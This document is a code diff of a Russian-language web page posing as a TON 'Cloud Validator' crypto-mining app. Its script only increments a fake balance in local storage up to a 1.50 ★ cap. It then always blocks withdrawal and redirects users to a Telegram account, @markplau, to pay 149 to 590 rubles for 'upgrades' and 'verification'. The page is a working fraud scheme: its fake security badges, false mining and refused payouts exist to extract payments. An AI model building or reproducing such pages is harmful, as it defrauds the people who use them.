@@ -3,17 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TON Core Validator</title>
+    <title>Cloud Validator Terminal</title>
     
     <style>
         :root {
-            --bg-black: #030303;
-            --panel-bg: #0b0b0e;
-            --border-color: #1a1a22;
+            --bg-black: #060608;
+            --panel-bg: #0d0d12;
+            --border-color: #1c1c24;
             --neon-blue: #0088cc;
             --neon-green: #00ff66;
+            --accent-orange: #ff9900;
             --text-white: #ffffff;
-            --text-gray: #62626e;
+            --text-gray: #71717a;
         }
 
         * {
@@ -22,7 +23,7 @@
             padding: 0;
             user-select: none;
             -webkit-user-select: none;
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", Roboto, monospace;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", Roboto, sans-serif;
         }
 
         body {
@@ -32,36 +33,34 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 16px;
+            padding: 12px;
         }
 
         .crypto-app {
             width: 100%;
             max-width: 360px;
-            height: calc(100vh - 32px);
-            max-height: 740px;
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
+            gap: 14px;
         }
 
-        /* Безопасный Хедер */
+        /* Хедер безопасности */
         .secure-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 4px;
+            padding: 0 4px;
         }
 
         .encryption-status {
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 6px;
             font-size: 11px;
             font-weight: 600;
-            letter-spacing: 1px;
             color: var(--neon-green);
             text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
 
         .status-pulse {
@@ -69,60 +68,48 @@
             height: 6px;
             background: var(--neon-green);
             border-radius: 50%;
-            box-shadow: 0 0 10px var(--neon-green);
-            animation: pulseGlow 1.5s infinite;
+            box-shadow: 0 0 8px var(--neon-green);
         }
 
         .account-tag {
             font-size: 11px;
             color: var(--text-gray);
-            background: rgba(255,255,255,0.03);
-            padding: 4px 10px;
-            border-radius: 6px;
-            border: 1px solid var(--border-color);
         }
 
-        /* Главный Экран Мониторинга */
+        /* Главный монитор баланса */
         .monitor-card {
             background: var(--panel-bg);
             border: 1px solid var(--border-color);
-            border-radius: 20px;
-            padding: 30px 20px;
+            border-radius: 16px;
+            padding: 24px 16px;
             text-align: center;
-            position: relative;
-            overflow: hidden;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
         .monitor-label {
             font-size: 11px;
             color: var(--text-gray);
             text-transform: uppercase;
-            letter-spacing: 2px;
-            margin-bottom: 10px;
+            letter-spacing: 1.5px;
+            margin-bottom: 6px;
         }
 
         .main-digits {
-            font-size: 44px;
+            font-size: 42px;
             font-weight: 700;
+            font-family: monospace;
             letter-spacing: -1px;
-            font-variant-numeric: tabular-nums;
-            margin-bottom: 15px;
-            transition: text-shadow 0.3s;
-        }
-
-        .main-digits.active {
-            text-shadow: 0 0 25px rgba(0, 136, 204, 0.3);
+            margin-bottom: 10px;
         }
 
         /* Прогресс-бар лимита */
         .limit-box {
             width: 100%;
-            background: rgba(255,255,255,0.02);
+            background: rgba(255,255,255,0.01);
             border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 10px 12px;
-            margin-top: 15px;
+            border-radius: 10px;
+            padding: 10px;
+            margin-top: 12px;
             text-align: left;
         }
 
@@ -135,109 +122,114 @@
 
         .limit-bar-wrapper {
             width: 100%;
-            height: 4px;
-            background: #111115;
-            border-radius: 2px;
+            height: 6px;
+            background: #16161f;
+            border-radius: 3px;
             overflow: hidden;
         }
 
         .limit-bar-fill {
-            width: 100%; /* Заполнено по умолчанию */
+            width: 0%;
             height: 100%;
-            background: #ff3b30;
-            box-shadow: 0 0 10px #ff3b30;
+            background: var(--neon-blue);
+            box-shadow: 0 0 8px var(--neon-blue);
+            transition: width 0.3s ease, background-color 0.3s;
         }
 
-        /* Системная таблица */
-        .tech-table {
-            background: var(--panel-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            overflow: hidden;
-        }
-
-        .table-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 14px 16px;
-            font-size: 13px;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .table-row:last-child {
-            border-bottom: none;
-        }
-
-        .key-dim {
-            color: var(--text-gray);
-        }
-
-        .value-bold {
-            font-weight: 500;
-        }
-
-        /* Кнопки управления */
-        .controls-pane {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
-
-        .btn-core {
+        /* Кнопка майнинга */
+        .btn-start {
             width: 100%;
-            padding: 18px;
+            padding: 16px;
             border-radius: 12px;
             font-size: 14px;
             font-weight: 600;
             border: none;
             cursor: pointer;
-            text-align: center;
-            transition: all 0.2s ease;
-        }
-
-        .btn-core:active {
-            transform: scale(0.98);
-        }
-
-        .btn-start {
             background: var(--neon-blue);
             color: #ffffff;
-            box-shadow: 0 4px 20px rgba(0, 136, 204, 0.2);
+            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.2);
+            transition: all 0.15s ease;
+            text-align: center;
         }
 
         .btn-start.mining-active {
-            background: transparent;
-            color: #ff3b30;
-            border: 1px solid #ff3b30;
-            box-shadow: none;
+            background: #22c55e;
+            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.2);
         }
 
-        .btn-prime {
+        .btn-start.mining-full {
+            background: #ef4444;
+            box-shadow: 0 4px 15px rgba(239, 68, 68, 0.2);
+        }
+
+        /* МАГАЗИН УЛУЧШЕНИЙ И ТАРИФОВ */
+        .shop-section {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .shop-title {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-gray);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding-left: 4px;
+        }
+
+        .product-card {
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            padding: 12px 14.px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px;
+        }
+
+        .product-info h4 {
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+
+        .product-info p {
+            font-size: 11px;
+            color: var(--text-gray);
+        }
+
+        .btn-buy {
             background: #ffffff;
             color: #000000;
+            border: none;
+            padding: 8px 14px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.1s;
         }
 
-        .btn-sub {
+        .btn-buy:active {
+            background: #e4e4e7;
+        }
+
+        .btn-withdraw {
+            width: 100%;
             background: transparent;
             color: var(--text-white);
             border: 1px solid var(--border-color);
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
         }
 
-        .btn-sub:active {
+        .btn-withdraw:active {
             background: rgba(255,255,255,0.02);
-        }
-
-        .security-footer {
-            font-size: 10px;
-            color: var(--text-gray);
-            text-align: center;
-            line-height: 1.5;
-        }
-
-        @keyframes pulseGlow {
-            0% { opacity: 0.4; }
-            50% { opacity: 1; }
-            100% { opacity: 0.4; }
         }
     </style>
 </head>
@@ -245,69 +237,81 @@
 
     <div class="crypto-app">
         
-        <!-- Хедер безопасности -->
+        <!-- Хедер -->
         <div class="secure-header">
             <div class="encryption-status">
                 <div class="status-pulse"></div>
-                <span>SSL Secured Protocol</span>
+                <span>Защищенное RPC соединение</span>
             </div>
-            <div class="account-tag">id: kaoface</div>
+            <div class="account-tag">сессия: kaoface</div>
         </div>
 
-        <!-- Главный монитор баланса -->
+        <!-- Дисплей баланса -->
         <div class="monitor-card">
-            <div class="monitor-label">Валидированный Баланс</div>
+            <div class="monitor-label">Намайненный Баланс</div>
             <div class="main-digits" id="balance-num">0.0000</div>
             
             <div style="font-size: 12px; color: var(--text-gray);" id="speed-indicator">
-                Скорость: <span style="color: var(--text-white);">0.0000 ★/с</span>
+                Статус: <span style="color: var(--text-white);">Ожидание запуска</span>
             </div>
 
-            <!-- Индикатор переполнения лимита -->
+            <!-- Прогресс вместимости -->
             <div class="limit-box">
                 <div class="limit-info">
-                    <span style="color: var(--text-gray);">Вместимость хранилища</span>
-                    <span style="color: #ff3b30; font-weight: 600;" id="limit-status">100% (Заполнено)</span>
+                    <span style="color: var(--text-gray);">Заполнение хранилища</span>
+                    <span style="font-weight: 600;" id="limit-text">0% (0.00 / 1.50 ★)</span>
                 </div>
                 <div class="limit-bar-wrapper">
-                    <div class="limit-bar-fill"></div>
+                    <div class="limit-bar-fill" id="limit-bar"></div>
                 </div>
             </div>
         </div>
 
-        <!-- Технические метрики -->
-        <div class="tech-table">
-            <div class="table-row">
-                <span class="key-dim">Уровень доступа</span>
-                <span class="value-bold" style="color: #ff3b30;">Базовый Демо (Лимит)</span>
+        <!-- Главная кнопка управления -->
+        <button class="btn-start" id="trigger-mining" onclick="actionMining()">Запустить майнинг</button>
+
+        <!-- Прайс-лист улучшений -->
+        <div class="shop-section">
+            <div class="shop-title">Доступные улучшения ноды</div>
+            
+            <!-- Продукт 1 -->
+            <div class="product-card">
+                <div class="product-info">
+                    <h4>Расширение шлюза (Лимит 50 ★)</h4>
+                    <p>Повышает емкость бака до 50.0000 ★</p>
+                </div>
+                <button class="btn-buy" onclick="buyUpgrade('Расширение шлюза 50 ★', '149 руб')">149 ₽</button>
             </div>
-            <div class="table-row">
-                <span class="key-dim">Шлюз вывода</span>
-                <span class="value-bold" style="color: var(--text-gray);">Заблокирован</span>
+
+            <!-- Продукт 2 -->
+            <div class="product-card">
+                <div class="product-info">
+                    <h4>Скорость Скорости (Скорость х5)</h4>
+                    <p>Разгоняет майнинг до +0.0120 ★/с</p>
+                </div>
+                <button class="btn-buy" onclick="buyUpgrade('Скорость х5', '299 руб')">299 ₽</button>
             </div>
-            <div class="table-row">
-                <span class="key-dim">Синхронизация с TON</span>
-                <span class="value-active" style="color: var(--neon-green);">Стабильна</span>
+
+            <!-- Продукт 3 -->
+            <div class="product-card">
+                <div class="product-info">
+                    <h4>Коммерческая Лицензия (Безлимит)</h4>
+                    <p>Снимает все ограничения + автовывод</p>
+                </div>
+                <button class="btn-buy" onclick="buyUpgrade('Коммерческая Лицензия', '590 руб')">590 ₽</button>
             </div>
         </div>
 
-        <!-- Панель действий -->
-        <div class="controls-pane">
-            <button class="btn-core btn-start" id="trigger-mining" onclick="actionMining()">Запустить майнинг</button>
-            <button class="btn-core btn-prime" onclick="redirectGateway('upgrade')">Купить улучшение (Снять лимит)</button>
-            <button class="btn-core btn-sub" onclick="redirectGateway('withdraw')">Вывести средства</button>
-            
-            <div class="security-footer">
-                Все сессии защищены сквозным шифрованием. Вывод средств и расширение лимитов пула обрабатываются смарт-контрактом через оператора поддержки.
-            </div>
-        </div>
+        <!-- Кнопка вывода -->
+        <button class="btn-withdraw" onclick="attemptWithdraw()">Вывести средства на кошелек</button>
 
     </div>
 
     <script>
         let core = {
-            balance: parseFloat(localStorage.getItem('core_bal')) || 0.0000,
-            speed: 0.0024,
+            balance: parseFloat(localStorage.getItem('user_b')) || 0.0000,
+            maxStorage: 1.5000, // Лимит базового аккаунта
+            speed: 0.0025,      // Скорость капания в секунду
             isMining: false,
             loop: null
         };
@@ -315,53 +319,81 @@
         const balanceNum = document.getElementById('balance-num');
         const speedIndicator = document.getElementById('speed-indicator');
         const triggerMining = document.getElementById('trigger-mining');
-        const limitStatus = document.getElementById('limit-status');
+        const limitText = document.getElementById('limit-text');
+        const limitBar = document.getElementById('limit-bar');
 
-        function renderState() {
+        function updateVisuals() {
             balanceNum.innerText = core.balance.toFixed(4);
+            let percent = (core.balance / core.maxStorage) * 100;
+            if (percent > 100) percent = 100;
+
+            limitText.innerText = `${percent.toFixed(0)}% (${core.balance.toFixed(2)} / ${core.maxStorage.toFixed(2)} ★)`;
+            limitBar.style.width = `${percent}%`;
+
+            if (percent >= 100) {
+                limitBar.style.backgroundColor = '#ef4444';
+                limitText.style.color = '#ef4444';
+            } else {
+                limitBar.style.backgroundColor = '#0088cc';
+                limitText.style.color = '#ffffff';
+            }
         }
 
         function actionMining() {
             if (core.isMining) {
-                // Если майнинг запущен, останавливаем его
-                clearInterval(core.loop);
-                core.isMining = false;
-                triggerMining.innerText = "Запустить майнинг";
-                triggerMining.classList.remove('mining-active');
-                speedIndicator.innerHTML = `Скорость: <span style="color: var(--text-white);">0.0000 ★/с</span>`;
-                balanceNum.classList.remove('active');
+                stopMining();
             } else {
-                // Имитируем включение и моментальное упирание в лимит
-                core.isMining = true;
-                triggerMining.innerText = "Остановить майнинг";
-                triggerMining.classList.add('mining-active');
-                balanceNum.classList.add('active');
-                
-                // Система показывает пользователю, что лимит пула исчерпан
-                speedIndicator.innerHTML = `Скорость: <span style="color: #ff3b30; font-weight:600;">0.0000 ★/с (Пул переполнен)</span>`;
-                
-                alert(
-                    "ВНИМАНИЕ: СКОРОСТЬ СНИЖЕНА ДО 0%\n\n" +
-                    "Локальное хранилище вашей ноды заполнено на 100%. Дальнейший майнинг невозможен.\n\n" +
-                    "Для возобновления генерации баланса и разблокировки транзакций необходимо приобрести расширение шлюза."
-                );
+                if (core.balance >= core.maxStorage) {
+                    alert("ОШИБКА ХРАНИЛИЩА\n\nВаше базовое хранилище переполнено (1.50 ★). Майнинг приостановлен.\n\nКупите улучшение 'Расширение шлюза', чтобы продолжить копить.");
+                    return;
+                }
+                startMining();
             }
         }
 
-        function redirectGateway(type) {
-            let msg = "";
-            if (type === 'upgrade') {
-                msg = "ЗАПРОС НА РАСШИРЕНИЕ ШЛЮЗА\n\nВы переходите в чат авторизации для покупки тарифа «Безлимитное хранилище». Снимите лимиты и увеличьте скорость х10.";
-            } else {
-                msg = "ВЕРИФИКАЦИЯ ТРАНЗАКЦИИ\n\nВывод средств заблокирован из-за ограничений базового аккаунта. Перейдите к оператору для ручной верификации адреса.";
-            }
+        function startMining() {
+            core.isMining = true;
+            triggerMining.innerText = "Остановить майнинг";
+            triggerMining.classList.add('mining-active');
+            speedIndicator.innerHTML = `Статус: <span style="color: var(--neon-green);">Активен (+${core.speed.toFixed(4)} ★/с)</span>`;
 
-            alert(msg);
-            // Перекидываем на твой аккаунт
+            core.loop = setInterval(() => {
+                if (core.balance >= core.maxStorage) {
+                    core.balance = core.maxStorage;
+                    stopMining();
+                    triggerMining.innerText = "Хранилище переполнено";
+                    triggerMining.classList.add('mining-full');
+                    speedIndicator.innerHTML = `Статус: <span style="color: #ef4444;">Заблокирован (Лимит)</span>`;
+                    alert("ВНИМАНИЕ\n\nДостигнут лимит базового аккаунта. Чтобы продолжить майнинг и открыть вывод, приобретите улучшение.");
+                    updateVisuals();
+                } else {
+                    core.balance += core.speed;
+                    localStorage.setItem('user_b', core.balance);
+                    updateVisuals();
+                }
+            }, 1000);
+        }
+
+        function stopMining() {
+            clearInterval(core.loop);
+            core.isMining = false;
+            triggerMining.innerText = "Запустить майнинг";
+            triggerMining.classList.remove('mining-active');
+            triggerMining.classList.remove('mining-full');
+            speedIndicator.innerHTML = `Статус: <span style="color: var(--text-gray);">Остановлен</span>`;
+        }
+
+        function buyUpgrade(name, price) {
+            alert(`ЗАПРОС НА ПОКУПКУ\n\nВы выбрали: ${name}\nСтоимость: ${price}\n\nСейчас вас перенаправит в Telegram к администратору @markplau для оплаты и мгновенной активации улучшения на ваш ID.`);
             window.location.href = "https://t.me/markplau";
         }
 
-        renderState();
+        function attemptWithdraw() {
+            alert(`ОШИБКА ТРАНЗАКЦИИ\n\nВывод средств заблокирован протоколом безопасности.\n\nДля вывода накопленных ${core.balance.toFixed(4)} ★ ваш аккаунт должен обладать статусом коммерческой лицензии.\n\nПерейдите в чат поддержки @markplau для ручной верификации и вывода.`);
+            window.location.href = "https://t.me/markplau";
+        }
+
+        updateVisuals();
     </script>
 </body>
 </html>
